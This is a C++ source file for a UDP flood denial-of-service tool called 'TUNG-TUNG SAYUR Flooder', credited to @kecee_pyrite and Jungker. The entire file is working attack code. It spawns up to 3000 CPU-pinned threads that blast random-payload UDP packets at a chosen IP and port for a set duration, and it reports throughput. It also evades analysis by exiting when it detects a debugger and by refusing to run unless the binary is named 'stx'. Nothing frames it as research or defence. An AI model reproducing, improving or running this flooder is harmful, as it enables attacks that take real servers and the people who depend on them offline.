
// stx_final.cpp - TUNG-TUNG SAYUR Flooder by @kecee_pyrite x Jungker
#include <iostream>
#include <thread>
#include <vector>
#include <chrono>
#include <atomic>
#include <random>
#include <cstring>
#include <csignal>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sched.h>
#include <fstream>

#define MAX_THREADS 3000
#define DEFAULT_BURST 50
#define DEFAULT_PAYLOAD_SIZE 1024
#define MAX_TOTAL_PACKETS 1000000000

std::atomic<bool> running(true);
std::atomic<long long> total_sent(0);

long get_total_memory_mb() {
    std::ifstream meminfo("/proc/meminfo");
    std::string line;
    long mem_kb = 0;
    while (std::getline(meminfo, line)) {
        if (line.find("MemTotal:") == 0) {
            sscanf(line.c_str(), "MemTotal: %ld kB", &mem_kb);
            break;
        }
    }
    return mem_kb / 1024;
}

int get_cpu_count() {
    return std::thread::hardware_concurrency();
}

std::string get_sender_ip() {
    std::string ip = "unknown";
    FILE* pipe = popen("hostname -I", "r");
    if (!pipe) return ip;
    char buffer[128];
    if (fgets(buffer, sizeof(buffer), pipe)) {
        ip = strtok(buffer, " \n");
    }
    pclose(pipe);
    return ip;
}

bool is_being_traced() {
    std::ifstream status("/proc/self/status");
    std::string line;
    while (std::getline(status, line)) {
        if (line.find("TracerPid:") != std::string::npos) {
            int pid = 0;
            sscanf(line.c_str(), "TracerPid:\t%d", &pid);
            if (pid != 0) return true;
        }
    }
    return false;
}

std::string generate_payload(int size) {
    static const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::string result;
    result.reserve(size);
    std::mt19937 rng(std::random_device{}());
    std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);
    for (int i = 0; i < size; ++i)
        result += charset[dist(rng)];
    return result;
}

void udp_flood(const std::string& ip, int port, int burst, int duration, int cpu_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_id, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    sockaddr_in target{};
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &target.sin_addr);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    int payload_size = DEFAULT_PAYLOAD_SIZE;
    int delay_us = 10000;
    std::string payload = generate_payload(payload_size);
    const char* data = payload.c_str();

    auto start_time = std::chrono::steady_clock::now();
    auto last_pps_report = start_time;
    int pps_counter = 0;

    while (running) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
        if (elapsed >= duration || total_sent >= MAX_TOTAL_PACKETS) break;

        for (int i = 0; i < burst; ++i) {
            sendto(sock, data, payload_size, 0, (sockaddr*)&target, sizeof(target));
            ++pps_counter;
            ++total_sent;
        }

        if (elapsed % 10 == 0 && std::chrono::duration_cast<std::chrono::seconds>(now - last_pps_report).count() >= 10) {
            std::cout << "[PPS Monitor] Sent in last 10s: " << pps_counter / 10 << " pps\n";
            pps_counter = 0;
            last_pps_report = now;
        }

        usleep(delay_us);
        if (delay_us > 0) delay_us -= 500;

        if (elapsed % 5 == 0) {
            if (payload_size < 1024) payload_size += 64;
        } else {
            if (payload_size > 128) payload_size -= 32;
        }

        payload = generate_payload(payload_size);
        data = payload.c_str();
    }

    close(sock);
}

void stop(int) {
    running = false;
}

void print_banner() {
    std::cout << R"(
╔════════════════════════════════════════════════════════════╗
║        TUNG - TUNG SAYUR x @KECEE_PYRITE x JUNGKER         ║
╚════════════════════════════════════════════════════════════╝
)";
}

void start_flood(const std::string& ip, int port, int duration, int threads) {
    int burst = DEFAULT_BURST;
    int cpu_count = get_cpu_count();
    long ram_mb = get_total_memory_mb();
    std::string sender_ip = get_sender_ip();

    print_banner();
    std::cout << "\n[!] Validation: stx OK\n";
    std::cout << "[*] VPS Sender IP : " << sender_ip << "\n";
    std::cout << "[*] VPS Spec      : " << ram_mb << " MB RAM | " << cpu_count << " CORES\n";
    std::cout << "[*] Flood Target  : " << ip << ":" << port << " | Threads: " << threads << "\n\n";

    signal(SIGINT, stop);
    std::vector<std::thread> workers;
    for (int i = 0; i < threads; ++i)
        workers.emplace_back(udp_flood, ip, port, burst, duration, i % cpu_count);
    for (auto& t : workers)
        t.join();

    double total_gb = (total_sent * DEFAULT_PAYLOAD_SIZE) / (1024.0 * 1024 * 1024);
    std::cout << "\n[+] Total packets sent : " << total_sent.load() << "\n";
    std::cout << "[+] Estimated data sent: " << total_gb << " GB\n";
    std::cout << "\n[✓] Flood completed successfully. Server disayur.\n";
}

int main(int argc, char* argv[]) {
    if (argc != 6 || std::string(argv[5]) != "stx") {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <duration> <threads> stx\n";
        return 1;
    }

    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    path[len] = '\0';
    std::string binname(path);
    if (binname.size() < 4 || binname.substr(binname.size() - 4) != "/stx") {
        std::cerr << "[X] Binary must be named 'stx' to run.\n";
        return 1;
    }

    if (is_being_traced()) {
        std::cerr << "[!] Tracing detected! Exiting.\n";
        return 1;
    }

    start_flood(argv[1], std::stoi(argv[2]), std::stoi(argv[3]), std::min(std::stoi(argv[4]), MAX_THREADS));
    return 0;
}
